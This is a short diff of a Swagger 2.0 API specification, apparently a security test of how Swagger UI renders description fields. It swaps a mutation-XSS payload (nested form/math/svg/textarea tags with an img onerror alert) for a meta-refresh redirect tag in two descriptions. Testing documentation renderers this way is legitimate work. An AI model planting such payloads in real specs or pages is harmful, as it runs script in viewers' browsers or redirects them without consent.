@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(window.origin) src=1>'></form>
+     <meta https-equiv="refresh" content="0;url=http://www.google.com">
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-             <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(window.origin) src=1>'></form>
+            <meta https-equiv="refresh" content="0;url=http://www.google.com">
 
           format: int64
           in: path
